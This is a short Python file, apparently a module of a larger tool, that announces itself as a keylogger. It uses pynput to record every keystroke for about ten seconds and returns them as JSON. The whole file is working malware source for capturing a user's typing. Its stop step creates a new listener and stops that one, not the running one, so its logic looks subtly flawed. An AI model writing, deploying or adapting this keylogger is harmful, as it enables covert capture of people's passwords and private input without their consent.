import json
from pynput import keyboard
import threading

keys = []
done_flag = threading.Event()

def on_press(key):
    try:
        keys.append(key.char)
    except AttributeError:
        keys.append(str(key))

def run_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def run():
    print("[*] Running keylogger module.")

    logger_thread = threading.Thread(target=run_logger, daemon=True)
    logger_thread.start()

    done_flag.wait(timeout=10)  # Capture keys for 10 seconds
    listener = keyboard.Listener(on_press=on_press)
    listener.stop()

    return json.dumps({
        "keystrokes": "".join(keys)
    }, indent=2)
